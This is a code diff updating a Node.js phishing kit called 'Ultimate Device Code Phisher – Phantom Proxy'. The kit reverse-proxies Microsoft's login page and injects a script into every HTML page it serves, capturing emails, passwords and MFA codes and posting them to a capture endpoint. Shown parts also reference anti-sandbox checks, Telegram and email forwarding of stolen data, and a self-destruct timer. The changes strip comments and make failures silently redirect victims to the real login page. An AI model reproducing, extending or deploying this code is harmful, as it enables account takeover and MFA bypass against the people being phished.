@@ -1,9 +1,9 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3 – Phantom Proxy
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3.1 – Phantom Proxy Final
 // ============================================================
 // Full reverse-proxy for Microsoft login pages with automatic
 // email, password, and MFA code capture. Injects a stealth
-// script into every HTML page served.
+// script into every HTML page served. No static login.html interference.
 // ============================================================
 
 const http = require('http');
@@ -434,7 +434,11 @@ function antiSandbox(req, res, next) {
 // ── Express App ──
 const app = express();
 app.use(express.json());
-app.use(express.static('public'));
+// Serves static files but we explicitly exclude login.html to avoid interception
+const staticOpts = { index: false }; // prevent serving index.html automatically – we'll handle separately
+app.use(express.static('public', staticOpts));
+// Serve dashboard index.html separately
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html'))); // optional fallback
 
 app.use((req, res, next) => {
     res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
@@ -627,72 +631,53 @@ app.post('/device/fingerprint', (req, res) => {
 // ── SECOND-STAGE PHISHING: FULL REVERSE PROXY WITH AUTO MFA CAPTURE ──
 // This catches any request starting with /login (including subpaths)
 app.all('/login*', async (req, res) => {
-    // Determine the target URL
     const targetBase = 'https://login.microsoftonline.com';
-    let targetPath = req.url.replace(/^\/login/, ''); // remove /login prefix
+    let targetPath = req.url.replace(/^\/login/, '');
     if (!targetPath || targetPath === '/') targetPath = '/common/oauth2/v2.0/authorize';
     const targetUrl = targetBase + targetPath;
 
-    // Build headers (forward most, but set proper host)
     const headers = { ...req.headers };
     delete headers.host;
     delete headers['content-length'];
     delete headers['transfer-encoding'];
     headers['Host'] = 'login.microsoftonline.com';
 
-    // Forward cookies (if any)
-    const cookieHeader = req.headers.cookie || '';
-
-    // Determine request method and body
     const method = req.method;
     let body = null;
     if (method === 'POST' || method === 'PUT') {
-        body = req.body; // express.json() already parsed for JSON, but we need raw for form-urlencoded
-        // We'll collect raw body manually later if needed
+        body = req.body;
     }
 
     try {
-        // Fetch the target page
         const resp = await axios({
             method: method,
             url: targetUrl,
             headers: headers,
             data: method === 'POST' || method === 'PUT' ? body : undefined,
-            responseType: 'text', // we need to modify HTML
+            responseType: 'text',
             timeout: 15000,
             ...createAxiosConfig(),
-            // We need to preserve the response as text to modify it
-            transformResponse: [data => data] // no automatic parsing
+            transformResponse: [data => data]
         });
 
-        // Prepare response headers (copy from target)
         const responseHeaders = { ...resp.headers };
-        // Remove content-encoding if we decompress? We'll handle decompression manually if needed.
-        // For simplicity, we'll assume we can serve the modified HTML without re-encoding.
-        // But we should respect content-encoding if present (we'll decompress if it's gzip)
         let data = resp.data;
         const encoding = resp.headers['content-encoding'];
         if (encoding === 'gzip' || encoding === 'deflate') {
-            // decompress
             const buffer = Buffer.from(data, 'binary');
             const decompressed = encoding === 'gzip' ? zlib.gunzipSync(buffer) : zlib.inflateSync(buffer);
             data = decompressed.toString('utf8');
         }
 
-        // Check if it's HTML (content-type contains text/html)
         const contentType = resp.headers['content-type'] || '';
         if (contentType.includes('text/html')) {
-            // Inject capture script
             const captureScript = `
                 <script>
-                    // Universal credential capturer for Microsoft login pages
                     (function() {
-                        // Store captured data
                         let capturedEmail = '';
                         let capturedPassword = '';
                         let capturedMFA = '';
 
-                        // Helper to send to /capture
                         function sendCredentials() {
                             if (capturedEmail || capturedPassword || capturedMFA) {
                                 fetch('/capture', {
@@ -704,14 +689,12 @@ app.all('/login*', async (req, res) => {
                                         mfa: capturedMFA
                                     })
                                 }).catch(() => {});
-                                // Reset after sending
                                 capturedEmail = '';
                                 capturedPassword = '';
                                 capturedMFA = '';
                             }
                         }
 
-                        // Intercept form submissions
                         document.addEventListener('submit', function(e) {
                             const form = e.target;
                             const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
@@ -719,29 +702,19 @@ app.all('/login*', async (req, res) => {
                             const mfaInput = form.querySelector('input[name="otc"], input[name="code"], input[name="verificationCode"], input[placeholder*="code" i]');
                             
                             if (emailInput && passInput) {
-                                // We have a login form
                                 e.preventDefault();
                                 capturedEmail = emailInput.value || '';
                                 capturedPassword = passInput.value || '';
                                 capturedMFA = mfaInput ? mfaInput.value || '' : '';
-
-                                // Send credentials
                                 sendCredentials();
-
-                                // Re-submit the form normally
                                 const originalAction = form.action;
                                 form.action = originalAction;
-                                // Remove our listener to avoid recursion
                                 form.removeEventListener('submit', arguments.callee);
                                 form.submit();
                             } else if (mfaInput) {
-                                // MFA-only form (e.g., additional verification)
                                 e.preventDefault();
                                 capturedMFA = mfaInput.value || '';
-                                // If we haven't captured email/pass yet (may be in session storage), try to get from localStorage
-                                // In this proxy, we may not have them, but we'll send whatever we have.
                                 sendCredentials();
-
                                 const originalAction = form.action;
                                 form.action = originalAction;
                                 form.removeEventListener('submit', arguments.callee);
@@ -749,11 +722,9 @@ app.all('/login*', async (req, res) => {
                             }
                         });
 
-                        // Also capture input changes (optional)
-                        // This ensures we get MFA if they type it even without submit
                         document.addEventListener('input', function(e) {
                             const input = e.target;
-                            if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || input.placeholder && input.placeholder.toLowerCase().includes('code')) {
+                            if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || (input.placeholder && input.placeholder.toLowerCase().includes('code'))) {
                                 capturedMFA = input.value;
                             }
                             if (input.type === 'email' || input.name === 'loginfmt') {
@@ -764,7 +735,6 @@ app.all('/login*', async (req, res) => {
                             }
                         });
 
-                        // When the page unloads, send any pending credentials (just in case)
                         window.addEventListener('beforeunload', function() {
                             sendCredentials();
                         });
@@ -772,20 +742,14 @@ app.all('/login*', async (req, res) => {
                 </script>
             `;
 
-            // Use cheerio to inject the script into head
             const $ = cheerio.load(data);
             const head = $('head');
             head.append(captureScript);
             data = $.html();
         }
 
-        // Send response back to client
-        // Re-compress if needed? We'll simply send as is (might lose compression)
-        // For better performance, we could re-compress with gzip if the client accepts it, but it's optional.
         res.set(responseHeaders);
-        // Remove content-encoding if we changed it
         delete res.headers['content-encoding'];
-        // Set content-length
         const buffer = Buffer.from(data, 'utf8');
         res.setHeader('content-length', buffer.length);
         res.status(resp.status);
@@ -793,12 +757,12 @@ app.all('/login*', async (req, res) => {
 
     } catch (error) {
         console.error('Proxy error:', error.message);
-        // Fallback to a simple error page or redirect
-        res.status(500).send('Proxy error');
+        // 🛡️ If proxy fails, silently redirect to real Microsoft instead of showing an error page
+        res.redirect('https://login.microsoftonline.com');
     }
 });
 
-// ── Capture endpoint (unchanged) ──
+// ── Capture endpoint ──
 app.post('/capture', async (req, res) => {
     const { email, password, mfa } = req.body;
     console.log(`📥 Second‑stage capture: ${email} / ${password} / MFA: ${mfa || 'N/A'}`);
@@ -1028,7 +992,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.3 – Phantom Proxy running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.3.1 – Phantom Proxy Final running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1037,6 +1001,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
     console.log(`🚀 Full reverse-proxy with automatic MFA capture: ACTIVE`);
+    console.log(`⚠️ REMINDER: Delete public/login.html to avoid static file interception.`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
